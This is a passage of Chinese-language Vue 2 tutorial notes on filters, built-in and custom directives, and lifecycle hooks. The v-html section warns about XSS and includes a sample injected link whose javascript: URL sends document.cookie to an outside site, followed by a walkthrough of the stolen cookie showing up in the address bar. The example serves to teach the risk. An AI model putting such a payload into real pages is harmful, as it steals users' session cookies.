        <h1>时间： {{ time | timeFormater }}</h1>
    </div>
    <script src="../node_modules/vue/dist/vue.js"></script>
    <script src="../node_modules/dayjs/dayjs.min.js"></script>
    <script>
        new Vue({
           el: '#app',
           data () {
              return {
                  time: Date.now()
              }
           },
        filters:{
            timeFormater(value){
                return dayjs(value).format('YY-MM-DD: mm-ss')
            }
        }
        })
    </script>
</body>
~~~

* 3. 过滤器的高级写法
*  过滤器接收的第一个参数是管道符前面的值
* 可以用第二个参数来接收过滤器传进来的参数

~~~html
<body>
    <div id="app">
        <!-- <h1>时间： {{ fTime }}</h1> -->
        <h1>时间： {{ time | timeFormater('YY-MM-DD: mm-ss') }}</h1>
    </div>
    <script src="../node_modules/vue/dist/vue.js"></script>
    <script src="../node_modules/dayjs/dayjs.min.js"></script>
    <script>
        new Vue({
           el: '#app',
           data () {
              return {
                  time: Date.now()
              }
           },
        filters:{
            timeFormater(value, str='YY-MM-DD'){
                return dayjs(value).format(str)
            }
        }
        })
    </script>
</body>
~~~

* 可以同时用多个过滤器，形成一种嵌套，后面的会将前面的值作为参数

~~~html
<body>
    <div id="app">
        <!-- <h1>时间： {{ fTime }}</h1> -->
        <h1>时间： {{ time | timeFormater('YY-MM-DD: mm-ss') | strSlice }}</h1>
    </div>
    <script src="../node_modules/vue/dist/vue.js"></script>
    <script src="../node_modules/dayjs/dayjs.min.js"></script>
    <script>
        new Vue({
           el: '#app',
           data () {
              return {
                  time: Date.now()
              }
           },
        filters:{
            timeFormater(value, str='YY-MM-DD'){
                return dayjs(value).format(str)
            },
            strSlice(value){
                return value.slice(0,4)
            }
        }
        })
    </script>
</body>
~~~

* 写在vue实例里的过滤器（局部过滤器）只能供该实例使用，其他vue实例（或组件）不能使用
* 局部过滤器，写在配置项 filters 里
* 全局过滤器，写在Vue.filter('方法名'，回调函数),传参方式一样

~~~html
<body>
    <div id="app">
        <h1>时间： {{ time | timeFormater('YY-MM-DD: mm-ss') | gSlice(5) }}</h1>
    </div>
    <div id="app2">
        <h2>截取{{ message | gSlice(5) }}</h2>
    </div>
    <script src="../node_modules/vue/dist/vue.js"></script>
    <script src="../node_modules/dayjs/dayjs.min.js"></script>
    <script>

        Vue.filter('gSlice',function(value,n){
            return value.slice(0,n)
        })

        new Vue({
           el: '#app',
           data () {
              return {
                  time: Date.now()
              }
           },
        filters:{
            timeFormater(value, str='YY-MM-DD'){
                return dayjs(value).format(str)
            },
            strSlice(value){
                return value.slice(0,4)
            }
        }
        })
        new Vue({
           el: '#app2',
           data () {
              return {
                  message: "123456789"
              }
           }
        })
    </script>
</body>
~~~

* 注意，v-model 不能绑定过滤器
* 可以用在插值语法里，v-bind 属性里

## 十五 内置指令

* v-on、v-bind，v-model

### v-text

* v-text 能替换掉节点里的内容
* v-text会将所有字符串正常当作字符串显示，不会解析标签文本

~~~html
<body>
    
    <div id="app">
        <h1>{{ msg }}</h1>
        <h1 v-text='msg'>我这几个字会被替换掉</h1>
    </div>

    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>
        new Vue({
           el: '#app',
           data () {
              return {
                  msg: 'hello vvvvv'
              }
           }
        })
    </script>
</body>
~~~

### v-html

* 它与v-text的区别就是他能解析标签文本
* 这里页面会显示出a连接

~~~html
<body>
    
    <div id="app">
        <h1>{{ msg }}</h1>
        <h1 v-html='msg'>我这几个字会被替换掉</h1>
        
    </div>

    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>
        new Vue({
           el: '#app',
           data () {
              return {
                  msg: 'hello  <a href="http://www.baidu.com">baidu</a>'
              }
           }
        })
    </script>
</body>
~~~

* 安全性问题
  * 对于这种能将字符串解析为标签的方式来说，存在着很大的问题 
  * xss攻击：冒充用户之手，就是利用用户的cookie来盗取信息

例如：

~~~html
<body>
    
    <div id="app">
        <h1 v-html='msg'></h1>
    </div>

    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>
        new Vue({
           el: '#app',
           data () {
              return {
                  msg: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>这是一段诱惑性文字，你看到一定会点我的</a>'
              }
           }
        })
    </script>
</body>
~~~

这段字符串将会被解析为a标签显示在页面上，如果用户点击了该链接，将跳转到该网站并附带上当前网站的cookie信息

1. 模拟一下，先打开浏览器的cookie工具然后写一些cookie在上面

2. 刷新是不会去除cookie的，点击该链接
3. 跳转到百度网站，发现此时的地址栏

~~~shell
https://www.baidu.com/?id=root;%20pwd=111111
~~~

4. 刚刚那个网站的cookie（刚刚自己写上去的）被作为参数传给了百度网站
5. cookie是很重要的，包含了一些用户的敏感信息
6. 所以不建议这种能直接将字符串解析为标签的方式
7. 虽然，可以在cookie信息后面将 httpOnly勾选上(这样会禁止操作cookie，只有http协议能够去修改和携带)，如果服务器不完善，没有加httpOnly给用户的敏感信息，会出现漏洞

### v-cloak

* 这个属性会在vue文件加载完，vue实例接管了容器的时候，删除掉该属性
* 为了用户在网速慢时候页面显示出未经解析的模板
* 配合css属性选择器使用

~~~html
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        [v-cloak]{
            display:'none'
        }
    </style>
</head>
<body>
    
    <div id="app">
        <h1 v-cloak>{{ msg }}</h1>
    </div>

    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>
        new Vue({
           el: '#app',
           data () {
              return {
                  msg: 'hello'
              }
           }
        })
    </script>
</body>
~~~

### v-once

* 只会加载一次值
* 第一个a 在初次动态渲染后，就视为静态内容
* 以后数据的改变，不会引起v-once所在标签里的数据的改变

~~~html
<body>
    
    <div id="app">
        <h1 v-once>a的初始值是：{{ a }}</h1>
        <h2>a: {{ a }}</h2>
        <button @click='a++'>a++</button>
    </div>

    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>
        new Vue({
           el: '#app',
           data () {
              return {
                  a: 1
              }
           }
        })
    </script>
</body>
~~~

### v-pre

* 会让vue跳过对它的解析
* 写成什么样，页面就显示什么样

~~~html
<body>
    
    <div id="app">
        <h1 v-pre>hello</h1>
        <h2 v-pre>a: {{ a }}</h2>
        <button v-pre @click='a++'>a++</button>
    </div>

    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>
        new Vue({
           el: '#app',
           data () {
              return {
                  a: 1
              }
           }
        })
    </script>
</body>
~~~

* 可以利用它跳过哪些没有用指令用法，插值语法的节点，加快编译，提高效率

## 十六 自定义指令

~~~html
<body>
    <div id="app">
        <h1>a的值为：<span v-text="a"></span></h1>
        <h2>a的五倍值为：<span v-five="a"></span></h1>
        <button @click="a++">a++</button>
    </div>

    <script>
        new Vue({
           el: '#app',
           data () {
              return {
                  a:1
              }
           },
           directives:{
            //    第一种写法，写为对象形式，可以处理一些细节上的问题
            //    five:{
            //        k:v,
            //        k:v,
            //        ...
            //    }
                //第二种写法，函数形式，不能处理一些细节问题
                five(element,binding){
                    console.log(element instanceof HTMLElement);//true
                    console.log(binding.value);//就是 v-five后的值
                    element.innerText = binding.value * 5
                }
           }
        })
    </script>
</body>
~~~

* 在vue实例里加上配置项 directives
* 用的时候加上  v-  前缀，定义指令时候不加该前缀
* 两种写法
  * 对象形式，麻烦，但是细节
  * 函数形式，简单，但是不能细节处理
* 函数形式接收的第一个参数为DOM元素，第二个为对应的绑定关系
* 指令所在的模板重新解析时候，指令函数会被重新调用

**对象形式**

* 可以处理细节

**例子：让元素默认获取焦点**

~~~javascript
directives:{
               fbind(e,b){
                   e.value = b.value
                   e.focus()
               }
           }
~~~

* 这段代码在页面刷新之后，并不会获取焦点，当你点击按钮时候才可以，但其实页面刷新后，该函数执行过一次了
* 指令被调用的时机（对于函数形式）
  * 指令和元素成功绑定时候
  * 指令所在的模板重新解析时候
* 重点在指令和元素成功绑定时候，是在内存里绑定的，input并没有跑到页面的，因为input被vue管理时候，经过一些步骤后才渲染在页面上的

**使用对象形式**

~~~javascript
directives:{
			fbind:{
         bind(){
            console.log('bind');
         },
         inserted(){
            console.log('insert');
         },
         update(){
            console.log('update');
         }
     }
}
~~~

* 里面有三个函数（一般称为钩子）
  * bind()  : 建立绑定关系时候
  * inserted()： 指令所在元素被插入页面时候
  * update()：指令所在模板被重新解析时候
  * 这三个函数接收到的参数与函数指令形式一样  （element，binding）

~~~html
<body>
    <div id="app">
        <h1>a的值为：<span v-text="a"></span></h1>
        <hr>
        <input type="text" v-fbind:value="a">
        <button @click="a++">a++</button>
    </div>

    <script>
        new Vue({
           el: '#app',
           data () {
              return {
                  a:1
              }
           },
           directives:{
                fbind:{
                    bind(){
                        console.log('bind');
                    },
                    inserted(e,b){
                        console.log('insert');
                        e.value = b.value
                        e.focus()
                    },
                    update(e,b){
                        console.log('update');
                        e.value = b.value * 5
                        e.focus()
                    }
                }
           }
        })
    </script>
</body>
~~~

**注意点**

* 指令不要使用驼峰命名，会被编译成小写，并且报错找不到指令

* 建议使用 - 链接多个单词,注意这样不能写简写了，得加引号，后面function可简写

  * ~~~javascript
    "f-number":function(){}
    ~~~

* 三个钩子里的this都是window，（尽管没有用箭头函数）

* 以上例子都是写在vue实例里的，是局部指令，只能供该实例使用

* 所以要定义全局指令的方法和过滤器一样  Vue.directive("名字","配置对象|或函数")

## 十七 生命周期

图示：官网：[https://cn.vuejs.org/v2/guide/instance.html#%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%9B%BE%E7%A4%BA](https://cn.vuejs.org/v2/guide/instance.html#生命周期图示)

**生命周期函数**

* this都指向vue实例
* beforeCreate(): 在创建数据监测和数据代理开始之前
* created():在创建数据监测和数据代理之后
* beforeMount(): vue完成模板解析后生成虚拟DOM但是还没有挂载到真实页面
* mounted(）：vue完成模板解析后将虚拟DOM挂载到真实页面后调用
* beforeDestroy():
* destroyed():

### beforeCreate(): 

* 此时无法通过vm访问到data中的数据，methods中的方法，因为还没有开始数据代理

### created():

* 此时可以通过vm访问到data中的数据，methods中的方法

### beforeMount():

* 页面呈现的是未经vue编译的DOM结构
* 所有对DOM的操作，**最终**都不奏效

### mounted():

* 页面呈现的是经vue编译的DOM结构
* 所有对DOM的操作会奏效(但不建议这么干)
* 至此初始化过程结束，一般在这里进行如下操作
  * 开启定时器
  * 发送网络请求
  * 订阅消息
  * 绑定自身事件等初始操作

### beforeDestroy():



### destroyed():
